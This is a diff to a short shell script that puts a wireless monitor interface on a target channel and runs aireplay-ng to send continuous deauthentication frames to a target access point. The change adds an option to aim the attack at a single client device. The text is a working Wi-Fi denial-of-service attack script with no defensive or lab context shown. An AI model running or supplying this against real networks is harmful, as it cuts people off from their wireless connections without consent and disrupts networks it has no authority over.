@@ -3,4 +3,11 @@
 source ./config.cfg
 
 iwconfig $MONA channel $TARGET_CHANNEL
-aireplay-ng -0 0 -a $TARGET_BSSID $MONA --ignore-negative-one
+
+if [ -z "$TARGET_DEVICE" ]
+then
+    aireplay-ng -0 0 -a $TARGET_BSSID $MONA --ignore-negative-one
+else
+    aireplay-ng -0 0 -a $TARGET_BSSID -c $TARGET_DEVICE $MONA --ignore-negative-one
+fi
+
